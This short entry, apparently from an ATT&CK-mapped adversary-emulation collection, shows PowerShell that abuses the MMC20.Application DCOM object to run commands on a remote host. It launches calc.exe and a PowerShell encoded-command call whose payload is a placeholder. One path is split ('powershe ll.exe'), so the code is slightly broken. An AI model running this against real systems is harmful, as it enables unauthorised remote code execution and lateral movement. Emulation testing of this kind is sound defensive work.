
## DCOM Lateral Movement

MITRE ATT&CK Technique: [T1175](https://attack.mitre.org/wiki/Technique/T1175)

[DCOM Lateral Movement] (https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) 

Input:

    $c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.150.10.15"));
    $c.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\cmd.exe",$null,"/c calc.exe","7")
    $c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application",""));
    $c.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowershell\v1.0\powershe ll.exe",$null,"-e D39DJFJFJFJOSOD","7")
